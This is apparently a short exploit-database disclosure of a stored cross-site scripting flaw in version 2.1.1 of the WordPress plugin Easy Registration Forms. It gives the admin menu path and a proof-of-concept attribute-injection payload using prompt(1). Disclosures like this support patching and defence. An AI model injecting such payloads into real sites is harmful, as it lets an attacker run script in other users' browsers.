# Exploit Title: WrodPress Plugin Easy Registration Forms —— Stored Cross-Site Scripting
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/easy-registration-forms/
# Version :  V 2.1.1
# Vulnerability Type: Stored Cross-Site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. ERForms》All Forms》Add New Form,insert the xss payload "OnMoUsEoVeR=prompt(1)//
![image](https://github.com/BigTiger2020/word-press/blob/main/ERForms.png)  
